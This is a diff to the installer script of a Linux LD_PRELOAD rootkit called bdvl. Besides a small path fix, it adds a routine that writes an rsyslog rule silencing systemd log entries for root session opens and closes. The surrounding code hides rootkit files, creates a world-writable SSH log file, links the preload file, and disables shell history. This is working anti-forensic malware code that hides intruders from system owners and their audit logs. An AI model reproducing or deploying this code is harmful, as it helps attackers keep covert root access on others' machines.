@@ -413,7 +413,7 @@ setup_home()
 unset HISTFILE SAVEHIST TMOUT PROMPT_COMMAND
 [ \$(id -u) != 0 ] && su root
 [ \$(id -u) != 0 ] && kill -9 \$\$
-[ -f ~/etc/README ] && cat ~/etc/README | less && rm etc/README
+[ -f ~/etc/README ] && cat ~/etc/README | less && rm ~/etc/README
 
 clear
 [ -f ~/.ascii ] && printf \"\\e[1m\\e[31m\`cat ~/.ascii\`\\e[0m\\n\"
@@ -431,6 +431,13 @@ echo -e \"\\033[1mSSH logs: \\033[1;31m\$(cat ~/ssh_logs | wc -l)\\033[0m\""
     necho "Hiding rootkit files"
     touch $SSH_LOGS && chmod 777 $SSH_LOGS && ln -s $SSH_LOGS $1/ssh_logs
     chown 0:$MGID $LDSO_PRELOAD $SSH_LOGS $1 $1/* $1/.profile $1/.bashrc $1/.ascii
+
+    necho "Attempting to fix systemd"
+    if [ -d /etc/rsyslog.d ]; then
+        echo 'if ($programname == "systemd" or $programname == "systemd-logind") and (($msg contains "New session" and $msg contains "of user root") or ($msg contains "session opened for user root by (uid=0)") or ($msg contains "Removed session") or ($msg contains "session closed for user root")) then stop'>/etc/rsyslog.d/bdvl_sysd.conf
+        systemctl restart rsyslog
+        secho "New systemd rules written."
+    fi
 }
 
 install_bdvl()
